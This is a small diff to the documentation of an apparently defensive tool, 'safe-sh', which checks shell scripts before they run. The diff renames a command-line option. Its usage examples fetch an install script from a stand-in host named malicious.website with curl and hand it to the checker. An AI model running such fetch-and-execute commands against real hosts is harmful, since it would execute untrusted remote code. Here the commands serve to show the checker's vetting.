@@ -14,4 +14,4 @@ curl -fsSL https://malicious.website/install.sh | uv run safe-sh
 uv run safe-sh -c "$(curl -fsSL https://malicious.website/install.sh)"
 ```
 
-Adjust the warning threshold with `--warn-on` and the error threshold with `--threshold`, or make the logs shorter with `--short`.
+Adjust the warning threshold with `--warn-on` and the error threshold with `--error-on`, or make the logs shorter with `--short`.
